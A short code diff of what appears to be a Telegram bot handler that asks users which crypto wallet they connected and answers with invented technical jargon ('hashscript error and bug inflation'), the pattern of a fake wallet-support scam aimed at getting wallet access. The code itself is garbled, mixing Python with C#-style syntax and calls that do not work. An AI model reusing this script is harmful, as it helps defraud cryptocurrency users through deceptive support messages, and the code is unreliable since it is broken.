@@ -17,7 +17,7 @@ def start(update, context):
 
 
 def echo(update, context):
-    update.message.reply_text('Which wallet account did you use to connect')
+    update.message.reply_text(update.message.Chat.Id, 'Which wallet account did you use to connect')
     if (update.Message.ReplyToMessage.Text.Contains("your username")):
         {
             update.message.reply_text('I understand what the problem is your installed wallet is currently facing a BOT response delay due to some hashscript error and bug inflation, that is the main reason why your account activities could not be processed successfully.')
@@ -26,6 +26,7 @@ def echo(update, context):
         {
             ...
         }
+
 
 
 
